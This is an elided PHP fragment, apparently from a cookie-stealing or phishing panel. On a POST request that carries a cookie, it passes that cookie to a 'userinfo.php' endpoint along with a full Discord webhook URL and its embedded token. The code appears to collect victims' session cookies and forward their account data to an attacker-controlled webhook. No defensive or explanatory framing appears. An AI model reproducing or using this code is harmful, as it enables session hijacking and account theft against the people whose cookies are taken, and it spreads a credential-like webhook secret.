...
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    ...
    if (empty($errors)) {
        ...
        if ($cookie) {
            ...
            $userInfo = file_get_contents("$dom/controlPage/apis/userinfo.php?cookie=$cookie&web=https://discord.com/api/webhooks/1437736154358222989/fmNl_TFYS0uFI-9Mfm-4pvXhlOGpBeBauEUK_igmYJ12PGcKvdNAFkq9cwbi-n_msxGJ&dh=");
